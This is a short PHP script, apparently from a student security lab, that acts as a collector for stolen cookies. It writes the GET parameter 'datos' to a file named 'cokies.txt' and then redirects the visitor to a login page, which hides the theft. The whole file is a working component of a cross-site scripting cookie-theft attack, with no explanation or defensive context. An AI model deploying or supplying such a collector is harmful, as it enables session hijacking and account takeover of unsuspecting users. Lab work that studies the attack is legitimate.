<?php

	$file = fopen ("cokies.txt", "w");
	$info = $_GET['datos'];
	fwrite ($file, $info);
	fclose ($file);
	header ("Location: http://localhost/Practica2/login.php");
?>